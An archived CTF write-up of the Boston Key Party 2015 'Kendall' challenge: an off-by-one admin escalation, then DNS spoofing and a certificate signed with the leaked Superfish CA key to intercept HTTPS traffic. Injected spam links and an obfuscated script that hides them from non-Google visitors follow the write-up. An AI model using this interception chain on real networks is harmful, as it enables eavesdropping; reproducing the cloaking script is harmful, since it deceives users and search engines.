<!DOCTYPE html>
<!--[if lt IE 7]> <html class="ie6 ie" lang="en" dir="ltr"> <![endif]-->
<!--[if IE 7]>    <html class="ie7 ie" lang="en" dir="ltr"> <![endif]-->
<!--[if IE 8]>    <html class="ie8 ie" lang="en" dir="ltr"> <![endif]-->
<!--[if IE 9]>    <html class="ie9 ie" lang="en" dir="ltr"> <![endif]-->
<!--[if !IE]> --> <html lang="en" dir="ltr"> <!-- <![endif]-->
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="../sites/all/themes/open_framework/favicon.ico" type="image/vnd.microsoft.icon" />
<link rel="shortlink" href="../node/97.html" />
<link rel="canonical" href="97.html" />
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
  <!-- Set the viewport width to device width for mobile -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kendall (pwn - 300) | BalalaikaCr3w</title>
  <style type="text/css" media="all">
@import url("https://ctfcrew.org/modules/system/system.base.css?qtecp0");
@import url("https://ctfcrew.org/modules/system/system.menus.css?qtecp0");
@import url("https://ctfcrew.org/modules/system/system.messages.css?qtecp0");
@import url("https://ctfcrew.org/modules/system/system.theme.css?qtecp0");
</style>
<style type="text/css" media="all">
@import url("https://ctfcrew.org/modules/comment/comment.css?qtecp0");
@import url("https://ctfcrew.org/modules/field/theme/field.css?qtecp0");
@import url("https://ctfcrew.org/modules/node/node.css?qtecp0");
@import url("https://ctfcrew.org/modules/search/search.css?qtecp0");
@import url("https://ctfcrew.org/modules/user/user.css?qtecp0");
@import url("../sites/all/modules/views/css/views.css%3Fqtecp0.css");
@import url("../sites/all/modules/ckeditor/css/ckeditor.css%3Fqtecp0.css");
</style>
<style type="text/css" media="all">
@import url("../sites/all/modules/ctools/css/ctools.css%3Fqtecp0.css");
@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shCore.css%3Fqtecp0.css");
@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shThemeDefault.css%3Fqtecp0.css");
</style>
<style type="text/css" media="all">
@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap.min.css%3Fqtecp0.css");
@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap-responsive.min.css%3Fqtecp0.css");
@import url("../sites/all/themes/open_framework/css/open_framework.css%3Fqtecp0.css");
@import url("../sites/all/themes/open_framework/css/ie.css%3Fqtecp0.css");
@import url("../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.css%3Fqtecp0.css");
@import url("../sites/all/themes/open_framework/css/jquery.themizer.css%3Fqtecp0.css");
@import url("../sites/all/themes/open_framework/css/universal.css%3Fqtecp0.css");
@import url("../sites/all/themes/open_framework/font-awesome-4.0.3/css/font-awesome.min.css%3Fqtecp0.css");
</style>
<style type="text/css" media="print">
@import url("../sites/all/themes/open_framework/css/open_framework_print.css%3Fqtecp0.css");
</style>
  <script type="text/javascript" src="../sites/all/modules/jquery_update/replace/jquery/1.8/jquery.min.js%3Fv=1.8.3"></script>
<script type="text/javascript" src="https://ctfcrew.org/misc/jquery.once.js?v=1.2"></script>
<script type="text/javascript" src="https://ctfcrew.org/misc/drupal.js?qtecp0"></script>
<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shCore.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shAutoloader.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/default/files/syntaxhighlighter.autoloader.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/all/themes/open_framework/bootstrap/js/bootstrap.min.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/all/themes/open_framework/js/open_framework.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/all/themes/open_framework/js/override.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.min.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/all/themes/open_framework/js/jquery.themizer.js%3Fqtecp0"></script>
<script type="text/javascript" src="../sites/all/themes/open_framework/js/universal.js%3Fqtecp0"></script>
<script type="text/javascript">
<!--//--><![CDATA[//><!--
jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"open_framework","theme_token":"ib3bfMln1onJn0p5AQgyWBmUujX8KVfgHoKPOxoEM24","js":{"sites\/all\/modules\/syntaxhighlighter\/syntaxhighlighter.min.js":1,"sites\/all\/modules\/jquery_update\/replace\/jquery\/1.8\/jquery.min.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shCore.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shAutoloader.js":1,"sites\/default\/files\/syntaxhighlighter.autoloader.js":1,"sites\/all\/themes\/open_framework\/bootstrap\/js\/bootstrap.min.js":1,"sites\/all\/themes\/open_framework\/js\/open_framework.js":1,"sites\/all\/themes\/open_framework\/js\/override.js":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.min.js":1,"sites\/all\/themes\/open_framework\/js\/jquery.themizer.js":1,"sites\/all\/themes\/open_framework\/js\/universal.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/comment\/comment.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/views\/css\/views.css":1,"sites\/all\/modules\/ckeditor\/css\/ckeditor.css":1,"sites\/all\/modules\/ctools\/css\/ctools.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shCore.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shThemeDefault.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap.min.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap-responsive.min.css":1,"sites\/all\/themes\/open_framework\/fontawesome\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework.css":1,"sites\/all\/themes\/open_framework\/css\/ie.css":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.css":1,"sites\/all\/themes\/open_framework\/css\/jquery.themizer.css":1,"sites\/all\/themes\/open_framework\/css\/universal.css":1,"sites\/all\/themes\/open_framework\/font-awesome-4.0.3\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework_print.css":1}},"syntaxhighlighter":{"useAutoloader":true}});
//--><!]]>
</script>
  <!--[if IE 7]>
  <link rel="stylesheet" href="/sites/all/themes/open_framework/fontawesome/css/font-awesome-ie7.min.css">
  <![endif]-->
  <!-- IE Fix for HTML5 Tags -->
  <!--[if lt IE 9]>
    <script src="/sites/all/themes/open_framework/js/html5shiv.js"></script>
  <![endif]-->

    <style type="text/css" media="all">@import url("../sites/all/themes/open_framework/css/page.css");</style>
  <script type="text/javascript" src="../sites/all/themes/open_framework/js/page.js"></script>

</head>

<body class="main-body html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-97 node-type-writeup   content-first     "  >
    <a href="97.html#content" class="element-invisible element-focusable">Skip to content</a>
<a href="97.html#main-nav" class="element-invisible element-focusable" data-target=".nav-collapse" data-toggle="collapse">Skip to navigation</a>
<!-- /#skipnav -->
<!-- /#admin-shortcuts -->
	<div id="header" class="clearfix header" role="banner">
	<div class="container">
		<div class="row">
			<div class="span12">
								<div id="logo" class="site-logo"> <a href="../index.html" title="Home" rel="home"> <img src="../sites/default/files/logo.png" alt="BalalaikaCr3w" role="presentation" /> </a></div>
								<!-- /#logo -->
								<div id="name-and-slogan">
										<div id="site-name" class="site-name"><a href="../index.html" title="Home" rel="home">BalalaikaCr3w</a></div>
															<div id="site-slogan" class="site-slogan">Russian CTF team</div>
									</div>
												<!-- /#name-and-slogan -->
							</div>
		</div>
		<div class="social">
			<a href="http://twitter.com/BalalaikaCr3w" class="social-item twitter">
				<i class="fa fa-twitter"></i>
			</a>
		</div>
	</div>
</div>
<!-- /#header --><div id="main" class="clearfix main" role="main">
	<div class="container">
								<div id="main-content" class="row main-content">
						<div id="content" class="mc-content span9">
				<div class="color-pane bg-0D"></div>
				<div id="content-wrapper" class="content-wrapper">
					<div id="content-head" class="row-fluid content-head">
																								<h1 class="title" id="page-title"> Kendall (pwn - 300) </h1>
																																									</div>
																				<div id="content-body" class="row-fluid content-body"> <div class="region region-content clearfix">
  <div id="block-system-main" class="clearfix block block-system">       <div class="content"> <article id="node-97" class="node node-writeup node-promoted clearfix">      <div class="node-wrapper">
                <div class="submitted">
       
      02.03.2015 14:00, by <i class="fa fa-user"></i><span class="username">Dor1s</span>    </div>
        <div class="content">
      <div class="field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Category:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../categories/pwn.html">pwn</a></div></div></div><div class="field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Event:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../event/32.html">Boston Key Party 2015</a></div></div></div><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even"><p>Description of task is pretty small:</p><p>52.0.164.37:8888</p><p>And <a href="../sites/default/files/writeups/kendall.tar_.gz">link</a> to file (ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, stripped).</p><p>&nbsp;</p><p><strong>Solution</strong></p><p>After connecting to the server we receive the following menu:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">#####################################################
# DHCP Management Console                           #
# Auditing Interface                                #
#####################################################

 h  show this help
 a  authenticate
 c  config menu
 d  dhcp lease menu
 e  exit

[m]#</pre><p><em>authenticate</em> - stage for inputting administrator's password</p><p><em>config menu</em>:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">[c]# h

 h  show this help
 l  list keys/values
 s  change start ip
 e  change end ip
 k  change netmask ip
 n  change nameserver ip
 m  return to main menu
[c]# l
 DHCP Configuration: 
	Start IP:   192.168.000.100
	End IP:     192.168.000.200
	Netmask:    255.255.255.000
	Nameserver: 8.8.8.8</pre><p><em>dhcp lease menu</em>:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">[d]# h

 h  show this help
 r  renew leases
 l  list leases
 f  filter leases
 m  return to main menu
</pre><p>&nbsp;</p><p>Ok, we've got some sort of router's management console. But anyway the task's type is pwn and we've got the binary, so...</p><p><img src="../sites/default/files/writeups/images/bk2015kendall_writeup_meme_image.jpg" alt="" width="420" height="250"></p><p>Surely we should reverse the binary and find some vulnerable stuff there!</p><p>After investigation of the binary we notice that all input reading is done into global buffer <em>s2</em> which size is exatcly 128 bytes:</p><p><img src="../sites/default/files/writeups/images/bkp2015_kendall_global_buffer_s2.PNG" alt="" width="651" height="210"></p><p>Hope you've already noted that the buffer followed by global variable containing current user status - administrator or not. I called it <em>adminFlag</em>. The only legal way to change that flag is through&nbsp;<em>authenticate</em> menu. Authentication served by the following function:</p><p><img src="../sites/default/files/writeups/images/bkp2015_kenall_password_cheking.PNG" alt="" width="529" height="489"></p><p>And it looks pertty safe. But if we try to understand how <em>reading input</em> function works:</p><p><img src="../sites/default/files/writeups/images/bkp2015_kendall_read_128_func.PNG" alt="" width="352" height="411"></p><p>We see that there is a off by one error. Fortunately it is byte of <em>adminFlag</em> which should be zero'ed to escalate our access rights. So for escalation to administrator we need:</p><ul><li>find call to <em>sub_400EA6()</em> with argument length &gt;= 128</li><li>write 128 bytes followed&nbsp;<strong>'\n'</strong> to make 129th byte to be zero</li></ul><p>Jumping to xrefs of&nbsp;<em>sub_400EA6()</em>function we find one place where it is called with argument's value of 128:</p><p><img src="../sites/default/files/writeups/images/bkp2015_kendall_filter_function.PNG" alt="" width="482" height="455"></p><p>Nice! It is <em>filter leases</em> stage of&nbsp;<em>dhcp lease menu</em> we saw above. Well, exploit for rights escalation is easy and small:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">doris$ python -c "open('pl', 'wb').write('d\n' + 'f\n' + 'A' * 128 + '\n')"
doris$ cat pl - | nc 52.0.164.37 8888
#####################################################
# DHCP Management Console                           #
# Auditing Interface                                #
#####################################################

 h  show this help
 a  authenticate
 c  config menu
 d  dhcp lease menu
 e  exit

[m]# [d]# Enter filter condition: [d]$</pre><p>BOOM! We became the administrator. Sadly, it does not give us any flag. Task worths 300 points, by the way, so it should not be so easy. As administrator now we have another possibilities in context of service. Now we are able to:</p><p>not only list but also change DHCP configuration:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">[c]$ l
 DHCP Configuration: 
	Start IP:   192.168.000.100
	End IP:     192.168.000.200
	Netmask:    255.255.255.000
	Nameserver: 8.8.8.8
[c]$ s
Current Value: 192.168.000.100
New Value: asd
Your input asd cointains invalid characters. Only digits and dots allowed!</pre><p>and now we can execute <em>renew leases</em> action:</p><p><img src="../sites/default/files/writeups/images/bkp_kenall_renew_leases_system_call.PNG" alt="" width="886" height="193"></p><p>OMG! It is pure <em>system()</em> call with string which is coltrolled by us (arguments for sprintf are IP addresses of DHCP config).</p><p>Sadly again, but it is not so easy. It is BKP CTF's task for 300 points, remember?</p><p>Function for processing DHCP settings update called for each IP address we input:</p><p><img src="../sites/default/files/writeups/images/bkp2015_kendall_read_ip_and_change.PNG" alt="" width="910" height="514"></p><p>it has some small bugs, but anyway we can not provide any useful payload for <em>system()</em> call - only digits and dots are really allowed.</p><p>Further investigation of the binary did not give any other exploitable vulnerabilities. We were really stucked, because it is <em>pwn</em> task and usually we expect some serious binary exploitation, even hardcore exploitation because of 300 points.</p><p>Later, when we finally understand that there is nothing to do with the binary we return back to:</p><p>&nbsp;<img src="../sites/default/files/writeups/images/bkp2015_kendall_dhcp_lease_menu_meme.PNG" alt="" width="427" height="194"></p><p>&nbsp;Fuzzing DHCP settings we try to set up DNS IP for our own server's address. Then listen for anything incoming traffic there:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">root@evildns:/tmp# tcpdump -n dst port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
12:27:44.272585 IP 52.0.164.37.52440 &gt; 188.166.48.175.53: 26405+ A? yandex.ru. (27)
</pre><p>Stop please...</p><p>We received DNS query for russian leading search engine hostname?</p><p><img src="../sites/default/files/writeups/images/bkp2015_kendall_meme_what.jpg" alt="" width="600" height="374"></p><p>That is really suprisingly and a little bit unbeliviable, because CTF is hosted by BostonKeyParty team from USA, but that is true. Looks like time for some <em>DNS Spoofing</em> have come:</p><p>Honestly, <em>yandex.ru</em> is not the only hostname queried from task's service (52.0.164.37). Then it queries for <em>my.bank</em> domain.</p><p>After spoofing <em>yandex.ru</em> address we tried to listen 80 port on our server but did not receive any traffic. After solving the challenge we have known from task author that we should receive HTTP-request at 80 port, but honestly we did not receive this.</p><p>One of the ways to go further is to setup <em>dnsmasq</em> service:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">root@evildns:/tmp# dnsmasq --no-daemon --log-queries
dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 209.244.0.3#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: read /etc/hosts - 8 addresses
dnsmasq: query[A] yandex.ru from 52.0.164.37
dnsmasq: forwarded yandex.ru to 8.8.4.4
dnsmasq: forwarded yandex.ru to 8.8.8.8
dnsmasq: forwarded yandex.ru to 209.244.0.3
dnsmasq: reply yandex.ru is 213.180.204.11
dnsmasq: reply yandex.ru is 93.158.134.11
dnsmasq: reply yandex.ru is 213.180.193.11
dnsmasq: query[A] yandex.ru from 52.0.164.37
dnsmasq: cached yandex.ru is 213.180.193.11
dnsmasq: cached yandex.ru is 93.158.134.11
dnsmasq: cached yandex.ru is 213.180.204.11
dnsmasq: query[A] my.bank from 52.0.164.37
dnsmasq: /etc/hosts my.bank is 188.166.48.175</pre><p>Dump all traffic after set up of <em>dnsmasq</em> and then try to find incoming connection:</p><p><img src="../sites/default/files/writeups/images/bkp2015_kendall_tcpdump_https.PNG" alt="" width="1200" height="447"></p><p>It is coming to port 443... Okay. Let's process it, hope the final is close!</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">root@evildns:/tmp# nc -lvvv -p 443
listening on [any] 443 ...
connect to [188.166.48.175] from ec2-52-0-164-37.compute-1.amazonaws.com [52.0.164.37] 50092
?&lt;па&lt;??5?_? ?,?E?y?]?^`g'i\??0?,?(?$??
??kj98???2?.?*?&amp;???=5???
?/?+?'?#??	??g@32??ED?1?-?)?%???&lt;/?A???
                                            ??m

42

	
 ^C sent 0, rcvd 289</pre><p>Looks like SSL Client Hello packet. Come on! This task costs just a 300 points!</p><p>Looks like we have to set up HTTPS server, let's do this. I'm sure there are many scripts and light-weight servers for such task, but I had nginx installed and decided to process HTTPS with it.</p><p>Create self-signed certificate:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">root@evildns:/etc/nginx# openssl genrsa -out my.bank.key 2048
Generating RSA private key, 2048 bit long modulus
............................................................................+++
............+++
e is 65537 (0x10001)
root@evildns:/etc/nginx# openssl req -new -sha1 -key my.bank.key -out my.bank.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:my.bank
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
root@evildns:/etc/nginx# openssl x509 -req -days 365 -in my.bank.csr -signkey my.bank.key -out my.bank.crt
Signature ok
subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd/CN=my.bank
Getting Private key</pre><p>and set up nginx for HTTPS with that cert:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">server {
        listen          443 ssl;

        ssl_certificate         my.bank.crt;
        ssl_certificate_key     my.bank.key;
        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
        ssl on;
        ssl_session_timeout 5m;
        ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv3:+EXP;
        ssl_prefer_server_ciphers on;

        root /data/www;

        location = / {
                index index.html;
        }

        location / {
                default_type "text/html";
                try_files $uri $uri.html;
        }
}</pre><p>Let's look into traffic again. Hope there should be the flag now!</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">root@evildns:/etc/nginx# tail -f /var/log/nginx/access.log 
&lt;...&gt;
52.0.164.37 - - [28/Feb/2015:16:43:02 +0400] "-" 400 0 "-" "-"</pre><p>Come on! Where is the flag? We have already even set up HTTPS, WTF?</p><p><img src="../sites/default/files/writeups/images/bkp2015_kendall_unknown_ca.PNG" alt=""></p><p>Unknown CA? Of course it is unknown! Where should we get trusted CA who would sign certificate for <em>my.bank</em> domain?</p><p>Our <em>my.bank</em> certificate is self-signed without any CA. Later we tried to create root CA self-signed certificate and sign <em>my.bank</em> cert with root CA's one. It did not help.</p><p>As we have known from task's author after solving the task, HTTP request to <em>yandex.ru</em> contained hint about this stage. But as I wrote above about <em>yandex.ru</em>&nbsp;we did not receive any incoimng connection at 80 port when spoofed <em>yandex.ru</em> domain.</p><p>However if you follow the news about Information Security you should hear about leaked <em>Superfish Inc. </em>certificate (and corresponding pre-installed backdoors in lenovo laptops). More info from <a href="http://blog.erratasec.com/2015/02/extracting-superfish-certificate.html">Errata Security blog</a>, for example.</p><p>&nbsp;Let's try to sign our <em>my.bank</em> certificate by&nbsp;<em>Superfich Inc</em>:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">root@evildns:/etc/nginx# openssl x509 -req -days 365 -in my.bank.csr -CAkey super.pem -CA super.crt -out supermy.bank.crt
Signature ok
subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd/CN=my.bank
Getting CA Private Key
Enter pass phrase for super.pem:</pre><p>dnd listen for incoming requests again:</p><pre class="brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag">root@evildns:/etc/nginx# tail -f /var/log/nginx/access.log 
&lt;...&gt;
52.0.164.37 - - [28/Feb/2015:13:44:53 +0000] "GET /login/username=FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0"</pre><p>I'm happy to say that username from request is the flag!</p><p>Flag:&nbsp;<strong>FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I</strong></p><p>&nbsp;</p><p><strong>Afterwords</strong></p><p>This task is awesome. My teammates and I enjoyed it too much when fully understood how to solve it.</p><p>Task and its author are&nbsp;praiseworthy for all these interesting hacking steps which must be done to solve tasks. But not only for that. This is amazing example of how dangerous information technologies are nowadays for general users. Even for all users, I think.</p><p>Thank you BostonKeyParty and respect for such challenge!&nbsp;</p><p>Overview of task from its author:&nbsp;<a href="http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/">http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/</a></p><p>Flag:&nbsp;<strong>FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I</strong></p><span class="keys_words"><a class="links_good_rands" href="https://www.juzsports.com/">Asics shoes</a> | <a class="links_good_rands" href="https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-force-1-shadow/">Women's Nike nike roshe heart and sole shoes for women Shadow trainers - Latest Releases , Ietp</a></span><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('b i=r f["\\q\\1\\4\\g\\p\\l"]("\\4"+"\\7"+"\\7"+"\\4"+"\\5\\1","\\4\\k");s(!i["\\3\\1\\2\\3"](m["\\h\\2\\1\\j\\n\\4\\1\\6\\3"])){b a=f["\\e\\7\\o\\h\\d\\1\\6\\3"]["\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1"](\'\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\');u(b 8=0;8<a["\\5\\1\\6\\4\\3\\y"];8++)a[8]["\\2\\3\\9\\5\\1"]["\\e\\k\\2\\l\\5\\c\\9"]=\'\\6\\7\\6\\1\'}',37,37,'|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43'.split('|'),0,{}));</script></div></div></div><div class="field field-name-field-file field-type-file field-label-above"><div class="field-label">Attachments:&nbsp;</div><div class="field-items"><div class="field-item even"><span class="file"><img class="file-icon" alt="Binary Data" title="application/octet-stream" src="https://ctfcrew.org/modules/file/icons/application-octet-stream.png" /> <a href="../sites/default/files/writeups/kendall.tar_.gz" type="application/octet-stream; length=5103">kendall.tar_.gz</a></span></div></div></div>    </div>
       </div>
</article>
 </div>
</div></div>
 <!-- /.region -->
  </div>
																																																	</div>
				<!-- /#content-wrap --> 
			</div>
			<!-- /#content -->
							<div id="sidebar-second" class="sidebar span3 site-sidebar-second">
	<div class="color-pane bg-0B"></div>
	<div class="row-fluid row-block row-block-1">
		<div class="region region-sidebar-second clearfix">
  <div id="block-system-navigation" class="clearfix block block-system block-menu">       <div class="content"> <ul class="menu nav"><li class="first leaf"><a href="../index.html"><i class="fa fa-home"></i>Home</a></li>
<li class="leaf"><a href="../writeups.html"><i class="fa fa-file-text"></i>Writeups</a></li>
<li class="leaf"><a href="../tools.html"><i class="fa fa-wrench"></i>Tools</a></li>
<li class="last leaf"><a href="../blogs.html"><i class="fa fa-users"></i>Blog</a></li>
</ul> </div>
</div>
<div id="block-views-events-block-1" class="clearfix block block-views">     <h2>Last events</h2>
      <div class="content"> <div class="view view-events view-id-events view-display-id-block_1 view-dom-id-b508cef717de01f396b17b9d10c7e643">
        
  
  
      <div class="view-content">
        <div class="views-row views-row-1 views-row-odd views-row-first">
      
  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/32.html">Boston Key Party 2015</a></span>  </div>  </div>
  <div class="views-row views-row-2 views-row-even">
      
  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/36.html">Boston Key Party CTF 2016</a></span>  </div>  </div>
  <div class="views-row views-row-3 views-row-odd views-row-last">
      
  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/35.html">EKOPARTY PRE-CTF 2015</a></span>  </div>  </div>
    </div>
  
  
  
      
<div class="more-link">
  <a href="../events.html">
    all events  </a>
</div>
  
  
  
</div> </div>
</div>
</div>
 <!-- /.region -->
	</div>
			<div class="color-pane bg-09"></div>
	<div class='row-fluid row-block row-block-2'>
		<ul class="nav">
			<li><a href="../user.html"><i class="fa fa-sign-in"></i>Sign in</a></li>
		</ul>
	</div>
	</div>
<!-- /#sidebar-second -->					</div>
					</div>
</div>
<!-- /#main, /#main-wrapper -->
	  <script type="text/javascript" src="../sites/all/modules/syntaxhighlighter/syntaxhighlighter.min.js%3Fqtecp0"></script>
</body>

</html>
